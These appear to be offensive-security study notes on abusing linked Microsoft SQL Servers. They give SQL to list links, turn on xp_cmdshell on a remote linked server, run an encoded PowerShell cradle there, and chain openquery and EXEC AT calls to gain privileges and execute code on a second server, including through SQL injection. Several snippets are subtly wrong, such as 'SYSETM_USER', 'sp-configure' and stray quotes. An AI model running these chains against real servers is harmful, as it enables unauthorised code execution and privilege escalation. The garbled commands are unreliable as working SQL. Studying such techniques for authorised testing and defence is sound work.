# Linked SQL Servers
Query executed on one server can fetch data or perform actions on another.

Creating Links:
- Admin must specify execution context to be used during connection
- if admin chooses specific SQL login that has sysadmin role we would get sysadmin on other server
- Works with low privilege
[enumerate-linked-servers.cs](./Code/enumerate-linked-servers.cs)

```sql
EXEC sp_linkedservers
```

## Run Query On Linked Server
Find the version and security context we are executing in:
```sql
SELECT version FROM openquery("server-01", 'SELECT @@version as version');

SELECT sysuser FROM openquery("server-01", 'SELECT @@SYSTEM_USER as sysuser');
SELECT SYSETM_USER;
```

Implement a Powershell cradle using xp_cmdshell:
```sql
EXEC ('sp-configure ''show advanced options'',1; RECONFIGURE;') AT server-01;
EXEC ('sp-configure ''xp_cmdshell'',1; RECONFIGURE;') AT server-01;
EXEC ('xp_cmdshell ''powershell -enc ABCEDC ''') AT server-01;
```

## Enumerating more links
Links are not bidirectional by default you may need to hop around.
[PoweruP.ps1](https://github.com/NetSPI/PowerUpSQL) is a tool to automate most of this.

To locate linked servers from a remote server:
```sql
EXEC ('sp_linkedservers') AT server-01;";
```

## Find Privileges
Determine which privileges we get on server-02 by executing a query on server-01, and inside that execute a query on server-02
- Remember to properly escape your quotes here
- Evelates privileges on server-02
```sql
SELECT myuser FROM openquery(\"server-01\", 'SELECT myuser FROM openquery(\"server-02\", ''SELECT SYSTEM_USER as myuser'')');
```

## Code Execution
You can achieve code execution in a similar manner:
- Effective in SQL injection
```sql
EXEC ('EXEC (''sp_configure ''''show advanced options'''',1; RECONFIGURE;'') AT server-02') AT server-01;
```
